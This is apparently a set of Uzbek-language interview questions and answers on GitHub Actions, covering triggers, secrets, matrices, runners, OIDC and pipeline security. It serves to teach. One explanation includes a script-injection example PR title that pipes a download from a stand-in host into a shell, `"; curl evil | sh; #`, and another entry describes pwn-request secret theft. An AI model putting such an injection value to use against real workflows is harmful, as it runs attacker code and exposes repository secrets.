questions.question: GitHub Actions'da workflow, job, step va action nima?
questions.explanation: Workflow = `.github/workflows/*.yml`; job = bitta runner'da ishlaydigan step'lar; step = `run` yoki `uses`; action = qayta ishlatiladigan blok.

questions.question: Workflow qaysi event'lar bilan ishga tushadi?
questions.explanation: `push`, `pull_request`, `schedule` (cron), `workflow_dispatch` (qo'lda), `release`, `workflow_call`, `repository_dispatch`; filter: `branches`, `paths`, `tags`.

questions.question: `runs-on` nima? GitHub-hosted va self-hosted runner farqi?
questions.explanation: `runs-on` job qaysi runner'da ishlashini tanlaydi. Hosted: har job toza VM, GitHub boshqaradi. Self-hosted: o'z mashinang, state qoladi, xavfsizlik sening zimmangda.

questions.question: Secret qanday saqlanadi va ishlatiladi?
questions.explanation: Settings > Secrets (repo/environment/org). `${{ secrets.NAME }}` bilan, log'da avtomatik `***` maskalanadi. Fork PR'ga secret berilmaydi.

questions.question: `needs` nima uchun kerak?
questions.explanation: Job'lar orasida bog'liqlik: `needs: build` — build muvaffaqiyatli tugamaguncha job boshlanmaydi. Output uzatish ham `needs.<job>.outputs` orqali.

questions.question: `if:` sharti va status funksiyalari (`success()`, `failure()`, `always()`, `cancelled()`) qanday ishlaydi?
questions.explanation: `if:` job/step'ni shartli bajaradi. Default `success()`. `always()` — har doim, `failure()` — oldingisi yiqilsa, `cancelled()` — bekor qilinsa.

questions.question: `env`, `vars` va `secrets` farqi?
questions.explanation: `env` — workflow/job/step darajasidagi o'zgaruvchi (YAML'da). `vars` — Settings'dagi maxfiy bo'lmagan konfiguratsiya. `secrets` — maxfiy, maskalanadi.

questions.question: Step'lar orasida qiymat qanday uzatiladi (`GITHUB_OUTPUT`, `GITHUB_ENV`)?
questions.explanation: `echo "k=v" >> $GITHUB_OUTPUT` — step output (`steps.<id>.outputs.k`). `echo "K=v" >> $GITHUB_ENV` — keyingi step'lar uchun env. Eski `::set-output` deprecated.

questions.question: Actions'da Docker image build qilib registry'ga (GHCR) push qilish qanday?
questions.explanation: `docker/login-action` (`GITHUB_TOKEN` + `packages: write`), `docker/setup-buildx-action`, `docker/build-push-action` cache bilan.

questions.question: Matrix strategy qanday ishlaydi?
questions.explanation: `strategy.matrix` bitta job'ni bir nechta kombinatsiyada ko'paytiradi (Go versiya × OS). `include`/`exclude`, `fail-fast`, `max-parallel`.

questions.question: Cache va artifact farqi nima?
questions.explanation: Cache — dependency'larni run'lar orasida qayta ishlatish (key bo'yicha, tezlik uchun). Artifact — run natijasini saqlash/job'lar orasida uzatish (binary, report).

questions.question: Reusable workflow va composite action farqi?
questions.explanation: Reusable workflow (`workflow_call`) — butun job'lar to'plami, alohida runner, secrets uzatiladi. Composite action — step'lar to'plami, chaqiruvchi job ichida ishlaydi.

questions.question: Environment va protection rule nima beradi?
questions.explanation: Environment (`staging`, `production`) — o'z secret'lari, required reviewer approval, wait timer, faqat ma'lum branch'dan deploy.

questions.question: `concurrency` kaliti nima uchun?
questions.explanation: Bir guruhda bir vaqtda faqat bitta run. `cancel-in-progress: true` — PR'ga yangi push eskisini bekor qiladi; deploy uchun — parallel deploy'ni oldini oladi.

questions.question: Job output'lari job'lar orasida qanday uzatiladi?
questions.explanation: Job darajasida `outputs:` step output'ga map qilinadi, keyingi job `needs.<job>.outputs.<name>` bilan o'qiydi. Faqat string, secret maskalangan bo'lsa bo'sh keladi.

questions.question: Dinamik matrix (`fromJSON`) va monorepo'da faqat o'zgargan servisni build qilish?
questions.explanation: Birinchi job o'zgargan papkalarni aniqlab JSON output beradi, ikkinchi job `matrix: ${{ fromJSON(...) }}` bilan faqat ularni build qiladi.

questions.question: `workflow_run` va `workflow_dispatch`/`repository_dispatch` qachon ishlatiladi?
questions.explanation: `workflow_run` — boshqa workflow tugaganda (CI yashil bo'lsa deploy). `workflow_dispatch` — qo'lda/API, input bilan. `repository_dispatch` — tashqi tizimdan API orqali custom event.

questions.question: Release/tag asosidagi deploy pipeline qanday quriladi?
questions.explanation: `on: push: tags: ['v*']` — build, test, image'ni semver tag bilan push, GitHub Release yaratish, changelog; production environment approval bilan.

questions.question: `continue-on-error`, `timeout-minutes` va retry qanday sozlanadi?
questions.explanation: `timeout-minutes` (default 360!) — osilgan job'ni o'ldiradi. `continue-on-error: true` — fail'ni job'ga ta'sir qildirmaydi (experimental matrix). Retry o'rnatilgan emas — action yoki skript bilan.

questions.question: `pull_request_target` nega xavfli?
questions.explanation: Base repo kontekstida, secret'lar va write token bilan ishlaydi. Agar fork PR kodini checkout qilib build qilsa — hujumchi secret'ni o'g'irlaydi (pwn request).

questions.question: Script injection (`${{ github.event... }}` in `run`) qanday yuz beradi?
questions.explanation: `${{ }}` YAML'da shell skriptga matn sifatida qo'yiladi. PR title `"; curl evil | sh; #` bo'lsa — buyruq bajariladi. Yechim: `env:` orqali o'zgaruvchi qilib uzatish.

questions.question: OIDC bilan cloud'ga secretsiz deploy qanday ishlaydi?
questions.explanation: `permissions: id-token: write` — job GitHub'dan qisqa muddatli JWT oladi; AWS/GCP/Azure trust policy'si `sub` claim (repo, branch, environment) bo'yicha tekshirib vaqtinchalik credential beradi.

questions.question: `GITHUB_TOKEN` permission'larini qanday cheklaysiz va nega?
questions.explanation: Workflow/job darajasida `permissions:` bilan least privilege: default `contents: read`, kerakli joyda alohida write. Org darajasida default read-only.

questions.question: Third-party action'larni nega SHA bilan pin qilish kerak?
questions.explanation: Tag (`@v4`) o'zgaruvchan — maintainer yoki hujumchi uni boshqa commit'ga ko'chirishi mumkin (tj-actions/changed-files 2025 hodisasi). Full commit SHA immutable.

questions.question: Self-hosted runner'larni K8s'da (ARC) qanday ishlatasiz?
questions.explanation: Actions Runner Controller — runner scale set, har job uchun ephemeral pod, queue bo'yicha autoscale (0 gacha). Xavfsizlik: ephemeral, alohida namespace, network policy, DinD o'rniga rootless build.

questions.question: Merge queue nima muammoni yechadi va CI'ni qanday moslash kerak?
questions.explanation: PR'lar alohida yashil, birga `main`ni sindirishi mumkin. Merge queue PR'ni navbatdagi o'zgarishlar ustida test qiladi va faqat yashil bo'lsa merge qiladi. Workflow `merge_group` event'ini tinglashi shart.

questions.question: Artifact attestation / SLSA provenance Actions'da qanday qilinadi?
questions.explanation: `actions/attest-build-provenance` — Sigstore orqali imzolangan provenance (qaysi repo, commit, workflow build qilgan). Deploy oldidan `gh attestation verify` yoki K8s admission policy bilan tekshiriladi.

questions.question: Flaky testlar CI'ni buzayotgan bo'lsa nima qilasiz?
questions.explanation: O'lcha (test bo'yicha fail rate), quarantine (alohida, required emas job), root cause (vaqt, tartib, parallel, tarmoq, shared state), tuzat, keyin qaytar. Retry — vaqtinchalik yamoq, yechim emas.

questions.question: Actions xarajati va tezligini qanday optimallashtirasiz?
questions.explanation: Measure (workflow vaqti, billable minutes, queue) > keraksiz trigger'ni kesish (`paths`, `concurrency cancel`) > cache > parallel/sharding > katta runner faqat kerakli job'ga > self-hosted/ARC katta hajmda.

questions.question: Ko'p repo'li organizatsiyada CI standartini qanday boshqarasiz?
questions.explanation: Markaziy reusable workflow'lar (versiyalangan), org ruleset'lar (required workflow/check), action allowlist, default `GITHUB_TOKEN` read-only, Dependabot bilan action update, OIDC trust policy shabloni.

questions.question: GitHub Actions workflow ostida qanday ishlaydi?
questions.explanation: Event (push, PR) → GitHub `.github/workflows/*.yml` ni o'qiydi → har job uchun toza runner VM/konteyner ajratadi → step'lar ketma-ket bajariladi → natija va log GitHub'ga qaytadi.
